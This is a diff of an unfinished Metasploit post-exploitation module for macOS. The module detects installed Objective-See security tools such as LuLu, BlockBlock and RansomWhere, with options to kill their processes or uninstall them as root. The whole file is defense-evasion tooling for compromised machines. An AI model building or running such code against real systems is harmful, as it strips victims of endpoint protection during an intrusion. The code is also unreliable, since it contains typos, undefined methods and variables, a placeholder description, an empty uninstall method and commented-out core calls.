@@ -4,9 +4,8 @@
 ##
 
 class MetasploitModule < Msf::Post
-
-  include Msf::Post::OSX 
-  include Msf::Post::Process 
+  include Msf::Post::OSX
+  include Msf::Post::Process
 
   def initialize(info = {})
     super(
@@ -14,93 +13,105 @@ class MetasploitModule < Msf::Post
         info,
         'Objective See Killer' => 'OSX Manage Module: Enumerate and disable Objective See products',
         'Description' => %q{
-          This module enumerates the system for the presence of Objective See products such as LuLu.
-          If these products are detected this module will also be able to disable those products by....todo fill in how it works
+          This module enumerates the system for the presence of Objective See products such as LuLu, BlockBlock, Do Not Disturb,
+          Rei Key, Ransom Where and Over Sight. If the disable option is set each product will be sent a kill
+          signal to the pid associated with the application. Removing the product entirely from the system is
+          also an option, removal occurs by <FILL IN>. Killing
+          the pid and removing the product both require sudo privlleges.
         },
         'License' => MSF_LICENSE,
         'Author' => [ 'gardnerapp' ],
-        'Platform' => [  'osx' ],
-        'URL'
+        'Platform' => [ 'osx' ],
+        'URL' => [
+          'https://objective-see.org/tools.html'
+        ],
         'SessionTypes' => [ 'meterpreter', 'shell' ]
       )
 
   )
-    register_options [
-      OptBool.new('DISABLE', [true, 'When set to true this module will disable all installed ObjectiveSee products by sending a kill signal to the associated ppid.', false] )
-    ]
+    register_options(
+      [
+        OptBool.new('KILL_PROCESSES', [true, 'When enabled all PID\'s associated with the installed Objective See products will be sent a kill signal. ', false]),
+        OptBool.new('UNINSTALL', [true, 'When enabled all of the Objective See products weill be uninstalled from the system.'])
+      ]
+    )
   end
 
   # Holds information on an objective see product. i.e name, installation status user perms, group perms, owner, and location on filesystem.
   class ObjectiveSee
 
-    # Arrays of products present on system & pid's of running processes
-    %w[present pids].each {|var| eval("@@#{var} = []", binding, __FILE__,__LINE__)}
-   
     def initalize(name)
       @name = name
       @path = "/Applications/#{name}"
-      @installed = is_installed?
-      @@present << self if is_installed?
-    end 
+      @installed = installed?
+
+      # @@present is a class variable which stores all of products installed on the system
+      # ObjectiveSee.installed_products => [<ObjectiveSee>,<ObjectiveSee>]
+      @@installed_products << self if installed?
+    end
+
+    # Arrays of products present on system & pid's of running processes
+    %w[installed_products all_pids].each { |var| eval("@@#{var} = []", binding, __FILE__, __LINE__) }
 
     # define accessor methods
-   %w[name path].each do |method|
-    define_method "#{method}" do
-      eval("@#{method}", binding, __FILE__, __LINE__)
-    end 
-   end 
+    %w[name path].each do |method|
+      define_method method.to_s do
+        eval("@#{method}", binding, __FILE__, __LINE__)
+      end
+    end
 
-   def is_installed?
-    @installed = is_dir?(@path)
-   end 
+    def installed?
+      @installed = is_dir?(@path)
+    end
 
-   def pid
-    # may return more than one pid need to test
-    @pid = pidof @name
-    print_status "DEBUG @pid = #{@pid.inspect} for @name = #{@nam}"
-   end 
+    def pid
+      # may return more than one pid need to test
+      @pid = pidof @name
+      print_status "DEBUG @pid = #{@pid.inspect} for @name = #{@nam}"
+    end
 
-   def running?
-    true unless @pid.nil?
-   end 
+    def running?
+      true unless @pid.nil?
+    end
 
-   class << self
-     %w[present pids].each do |method|
-      define_method method do
-        eval "@@#{method}", binding, __FILE__, __LINE__
-      end 
-     end 
-  end 
+    class << self
+      %w[installed_products all_pids].each do |method|
+        define_method method do
+          eval "@@#{method}", binding, __FILE__, __LINE__
+        end
+      end
+    end
+  end
 
   # determine which products are installed and their ppid if any
   def enumerate
-  	products = ["BlockBlock Helper.app", "KnockKnock.app", "LuLu.app"].map {|prod| ObjectiveSee.new prod}
+    products = ['LuLu.app', 'BlockBlock Helper.app', 'Do Not Disturb.app', 'ReiKey.app', 'RansomWhere.app', 'OverSight.app'].map do |prod|
+      ObjectiveSee.new prod
+    end
 
     # we only want the products installed on the system
-    products = products.filter_map {|product| product.installed? }
-    products.each {|prod| print_status "#{prod.name} is installed."}
+    products = products.filter_map(&:installed?)
+    products.each { |prod| print_status "#{prod.name} is installed." }
 
-    # determine which products are running. 
-    running = products.filter_map {|product| product.running? }
+    # determine which products are running.
+    products.filter_map(&:running?)
   end
 
-  def disable
-    unless is_root? fail_with(Failure::NoAcces, "Can not disable products unless running as root. Please escelate privlleges before re-running the module.")
+  def kill_pids
+    print_status("Killing all PID's for Objective See products.")
+    fail_with(Failure::NoAcces, 'Can not disable products unless running as root. Please escelate privlleges before re-running the module.') unless is_root?
 
-    ObjectiveSee.running.each {|prod| kill_process prod.pid }
-  end 
-
-  def disable_mode?
-    datastore['DISABLE']
+    ObjectiveSee.running.each { |prod| kill_process prod.pid }
   end
+
+  def uninstall; end
 
   def exploit
-  	print_status("Enumerating Objective See security products.")
-  	running = enumerate
+    print_status('Enumerating Objective See security products.')
+    enumerate
 
-    if disable_mode?
-      disable_products
-    end 
+    # kill_pids if datastore['KILL_PROCESSES']
+
+    # uninstall if datastore['']
   end
-
 end
